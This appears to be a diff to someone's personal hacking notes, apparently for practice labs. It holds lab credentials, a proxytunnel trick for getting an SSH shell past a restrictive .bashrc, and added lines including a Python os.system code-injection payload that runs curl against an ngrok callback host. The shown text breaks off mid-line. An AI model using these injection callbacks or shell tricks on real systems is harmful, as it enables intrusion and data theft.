@@ -116,6 +116,11 @@ eccbc87e4b5ce2fe28308fd9f2a7baf3
 
 
 
+
+
+
+
+
     Your credentials: wiener:peter
     Victim's credentials carlos:montoya
 
@@ -124,3 +129,10 @@ proxytunnel -p 192.168.2.4:3128 -d 127.0.0.1:22 -a 1234
 sudo ssh user@127.0.0.1 -p 1234 /bin/bash : if bashrc does not allow stable shell. After getting stable shell with this command delete .bashrc file.
 
 
+Remove spaces from a string: echo "$str"|sed 's/ //g'`
+
+
+import requests;r.get(url="https://3874-106-193-220-219.in.ngrok.io");
+
+
+__import__(\"os\").system(\"curl https://3874-106-193-220-219.in.ngrok.io
